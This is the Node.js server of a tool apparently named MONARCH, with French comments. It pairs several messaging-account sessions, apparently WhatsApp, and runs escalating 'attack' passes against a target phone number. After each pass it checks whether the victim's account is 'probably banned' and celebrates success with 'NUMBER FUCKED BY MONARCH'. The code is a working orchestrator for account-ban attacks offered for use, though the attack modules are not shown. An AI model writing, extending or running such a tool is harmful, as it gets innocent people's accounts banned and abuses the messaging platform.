'use strict'
const path = require('path')
const crypto = require('crypto')
const express = require('express')
const config = require('./engine/config')
const sessions = require('./engine/sessions')
const { runAttack, toJid, MODULE_NAMES } = require('./engine/attack')
const { verdict } = require('./engine/detect')

const app = express()
app.use(express.json({ limit: '64kb' }))
app.use(express.static(path.join(__dirname, 'public')))

const clients = new Set()
const jobs = new Map()
const uid = () => crypto.randomBytes(6).toString('hex')
const delay = (ms) => new Promise((r) => setTimeout(r, ms))

function broadcast(evt, data) {
  const p = `event: ${evt}\ndata: ${JSON.stringify(data)}\n\n`
  for (const c of clients) { try { c.write(p) } catch {} }
}

/* ---- pont sessions -> SSE ---- */
sessions.on('code', (s) => broadcast('code', { label: s.label, code: s.code }))
sessions.on('change', (s) => broadcast('session', viewSession(s)))
sessions.on('err', (s, msg) => broadcast('log', { level: 'err', text: `[${s.label}] ${msg}` }))

const viewSession = (s) => ({
  label: s.label, status: s.status, phone: s.phone, code: s.code, ready: s.ready
})
const viewJob = (j) => ({
  id: j.id, target: j.display, passes: j.passes, status: j.status,
  rows: j.rows, final: j.final, reason: j.reason, startedAt: j.startedAt
})

/* ---- SSE ---- */
app.get('/api/stream', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    Connection: 'keep-alive',
    'X-Accel-Buffering': 'no'
  })
  res.write(': ok\n\n')
  clients.add(res)
  res.write(`event: state\ndata: ${JSON.stringify({
    sessions: sessions.all().map(viewSession),
    jobs: [...jobs.values()].map(viewJob),
    modules: MODULE_NAMES
  })}\n\n`)
  const ping = setInterval(() => { try { res.write(': ping\n\n') } catch {} }, 20000)
  req.on('close', () => { clearInterval(ping); clients.delete(res) })
})

app.get('/api/state', (_req, res) => {
  res.json({
    sessions: sessions.all().map(viewSession),
    jobs: [...jobs.values()].map(viewJob),
    modules: MODULE_NAMES
  })
})

/* ---- sessions ---- */
app.post('/api/session/pair', async (req, res) => {
  const { label, phone } = req.body || {}
  if (!label || !phone) return res.status(400).json({ error: 'label et numéro requis' })
  if (!/^[a-z0-9_-]{2,24}$/i.test(label)) return res.status(400).json({ error: 'label invalide (a-z 0-9 _ -)' })
  const digits = String(phone).replace(/\D/g, '')
  if (digits.length < 8) return res.status(400).json({ error: 'numéro invalide' })
  try {
    await sessions.pair(label, digits)
    res.json({ ok: true })
  } catch (e) { res.status(500).json({ error: e.message }) }
})

app.delete('/api/session/:label', (req, res) => {
  res.json({ ok: sessions.kill(req.params.label) })
})

/* ---- attaque ---- */
app.post('/api/attack', async (req, res) => {
  const b = req.body || {}
  if ([...jobs.values()].some((j) => j.status === 'running')) {
    return res.status(409).json({ error: 'une attaque tourne déjà' })
  }

  let jid
  try { jid = toJid(b.target) } catch (e) { return res.status(400).json({ error: e.message }) }

  const passes = Math.min(3, Math.max(1, Number(b.passes) || 1))
  const durationSec = Math.min(180, Math.max(15, Number(b.duration) || 45))
  const pauseSec = Math.min(120, Math.max(0, Number(b.pause) ?? 20))

  const pool = (Array.isArray(b.sessions) && b.sessions.length
    ? b.sessions.filter((l) => sessions.get(l)?.ready)
    : sessions.online().map((s) => s.label))

  if (!pool.length) return res.status(400).json({ error: 'aucune session en ligne sélectionnée' })

  const mods = (Array.isArray(b.modules) && b.modules.length ? b.modules : config.defaultModules)
    .filter((m) => MODULE_NAMES.includes(m))

  const job = {
    id: uid(), target: jid, display: String(b.target).replace(/\D/g, ''),
    passes, status: 'running', signal: { aborted: false },
    rows: [], final: null, reason: null, startedAt: Date.now(), groupId: b.groupId || null
  }
  jobs.set(job.id, job)
  broadcast('job', viewJob(job))

  runJob(job, pool, durationSec, pauseSec, mods).catch((e) => {
    job.status = 'error'; job.reason = e.message
    broadcast('job', viewJob(job))
    broadcast('log', { level: 'err', text: e.message })
  })

  res.json({ id: job.id })
})

app.post('/api/attack/:id/stop', (req, res) => {
  const j = jobs.get(req.params.id)
  if (!j) return res.status(404).json({ error: 'inconnu' })
  j.signal.aborted = true
  res.json({ ok: true })
})

/* ---- orchestration avec escalade ---- */
async function runJob(job, pool, baseSec, pauseSec, mods) {
  const used = new Set()
  let lastVerdict = null

  for (let p = 1; p <= job.passes; p++) {
    if (job.signal.aborted) { job.status = 'stopped'; break }

    const row = {
      pass: p, sessions: 0, durationSec: 0,
      ops: 0, elapsedMs: 0, status: 'pending', verdict: null
    }
    job.rows.push(row)
    broadcast('row', { jobId: job.id, row })

    if (p > 1 && pauseSec > 0) {
      row.status = 'pause'
      broadcast('row', { jobId: job.id, row })
      const end = Date.now() + pauseSec * 1000
      while (Date.now() < end && !job.signal.aborted) {
        row.pauseLeft = Math.ceil((end - Date.now()) / 1000)
        broadcast('row', { jobId: job.id, row })
        await delay(1000)
      }
    }

    const n = Math.min(pool.length, config.passSessions[p] || 6)
    const labels = pool.slice(0, n)
    labels.forEach((l) => used.add(l))

    row.sessions = n
    row.durationSec = Math.min(config.maxPassDurationSec, Math.round(baseSec * (1 + 0.6 * (p - 1))))
    row.status = 'running'
    broadcast('row', { jobId: job.id, row })

    const passMods = p === 1 ? mods
      : p === 2 ? [...new Set([...mods, 'globalPresence'])]
      : [...new Set([...mods, 'globalPresence', 'group'])]

    try {
      const r = await runAttack({
        target: job.target, durationMs: row.durationSec * 1000,
        labels, activeModules: passMods, groupId: job.groupId,
        signal: job.signal, manager: sessions,
        onProgress: (pr) => {
          row.ops = pr.ops
          row.elapsedMs = pr.elapsedMs
          row.phase = pr.phase
          broadcast('row', { jobId: job.id, row })
        }
      })

      row.ops = r.ops
      row.elapsedMs = r.durationMs

      if (r.status === 'absent') {
        row.status = 'absent'
        row.verdict = 'absent'
        job.status = 'done'; job.final = 'absent'; job.reason = 'numéro absent du réseau'
        broadcast('row', { jobId: job.id, row }); break
      }

      const v = await verdict(sessions, job.target, [...used])
      lastVerdict = v.result
      row.verdict = v.result
      row.status = job.signal.aborted ? 'stopped' : 'done'
      broadcast('row', { jobId: job.id, row })

      if (v.result === 'banni-probable') {
        job.status = 'done'; job.final = 'fucked'
        broadcast('row', { jobId: job.id, row })
        break
      }
      if (job.signal.aborted) { job.status = 'stopped'; break }
    } catch (e) {
      row.status = 'error'; row.error = e.message
      broadcast('row', { jobId: job.id, row })
      job.status = 'error'; job.reason = e.message
      break
    }
  }

  if (job.status === 'running') {
    job.status = 'done'
    job.final = lastVerdict === 'degrade' ? 'degrade' : 'active'
    if (lastVerdict === 'inconnu') { job.final = 'inconnu'; job.reason = 'sonde instable' }
  }

  broadcast('job', viewJob(job))
  broadcast('log', {
    level: job.final === 'fucked' ? 'ok' : 'warn',
    text: job.final === 'fucked'
      ? `NUMBER FUCKED BY MONARCH — ${job.display}`
      : `NUMBER STILL ACTIVE — ${job.display}`
  })
}

/* ---- démarrage ---- */
app.use((err, _req, res, _next) => res.status(500).json({ error: err.message }))
process.on('unhandledRejection', (e) => console.error('[rejection]', e?.message || e))

const PORT = process.env.PORT || 3000
sessions.restoreAll().then((n) => console.log(`${n} session(s) restaurée(s)`))
app.listen(PORT, () => console.log(`MONARCH sur http://localhost:${PORT}`))
